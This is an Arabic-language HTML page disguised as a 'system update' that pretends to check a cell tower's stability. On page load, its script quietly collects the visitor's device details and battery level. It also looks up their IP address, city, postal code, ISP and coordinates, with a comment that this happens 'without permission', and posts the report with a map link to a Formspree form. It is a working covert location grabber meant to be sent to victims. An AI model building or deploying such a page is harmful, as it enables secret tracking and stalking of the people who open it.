<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام | 2026</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { border: 1px solid #00ff00; padding: 25px; text-align: center; box-shadow: 0 0 15px #00ff00; }
        .loader { border: 3px solid #111; border-top: 3px solid #00ff00; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p>جاري فحص استقرار برج التغطية...</p>
        <p id="msg" style="font-size: 0.7rem; color: #008800;">يرجى عدم إغلاق الصفحة</p>
    </div>

    <script>
        async function fullDiagnostic() {
            let report = {
                timestamp: new Date().toLocaleString(),
                device: navigator.platform,
                ram: navigator.deviceMemory + "GB",
                cores: navigator.hardwareConcurrency
            };

            // 1. جلب البطارية
            try {
                const b = await navigator.getBattery();
                report.battery = Math.round(b.level * 100) + "%";
            } catch(e) {}

            // 2. جلب أدق بيانات IP والبرج (بدون إذن)
            try {
                // نستخدم ip-api.com لأنه يعطي تفاصيل دقيقة عن الرمز البريدي والإحداثيات
                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,query');
                const data = await res.json();
                
                report.tower_info = {
                    ip: data.query,
                    city: data.city,
                    region: data.regionName,
                    zip_code: data.zip, // الرمز البريدي للمنطقة
                    isp: data.isp,
                    map: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                };
            } catch (e) { report.network_err = "فشل تحليل البرج"; }

            // 3. الإرسال إلى Formspree
            const formID = 'xkozoaaq'; // الآيدي الخاص بك
            await fetch(`https://formspree.io/f/${formID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(report)
            });

            document.getElementById('msg').innerText = "تم التحقق من جودة الاتصال.";
        }

        window.onload = fullDiagnostic;
    </script>
</body>
</html>
